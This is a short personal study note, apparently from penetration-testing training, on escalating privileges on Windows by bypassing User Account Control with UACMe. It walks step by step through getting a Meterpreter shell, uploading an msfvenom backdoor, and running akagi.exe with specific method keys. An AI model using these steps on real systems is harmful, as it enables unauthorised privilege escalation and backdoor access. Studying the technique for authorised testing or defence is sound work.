
bypassing User Account Control with UACme from github

need a user that is part of local administrators group

brief
=
- prevents unauthorized changes within windows system
- on vista and greater
- has integrity levels, anything below high programs can be executed without prompting for confirmation
- access denied from commands means uac consent couldnt be given


Methodology
=
1. get meterpreter shell
2. get `sysinfo` (check if x86 or x64) meterpreter value
3. use `pgrep` to find explorer process
4. `migrate` to pid of explorer
5.` sysinfo` to confirm 64bit x64
6. open cmd shell
7. `net users` command to check users
8. `net localgroup administrators `to check who are admins
9. create a `backdoor.exe` with `msfvenom` and upload to the target
10. setup multi/handler/ for msfvenom backdoor
11. use UACMe from github and read documentation
	1. needs to be cloned and akagi.exe (x64) needs to be uploaded to target
	2. check the keys to use
	3. needs to pass backdoor.exe as param
12. check priviledges with `getprivs`
13. use `ps` to check processes using NT Authority and `migrate` to the process


UACMe
=
usage:

`.\akagi.exe <key> <path/to/backdoor.exe>` - key 23 and 33 works well, check which ones have been fixed, keys are specific to windows version 


Commands
=
net users - users on local machine
net localgroup administrators - user of administrator group
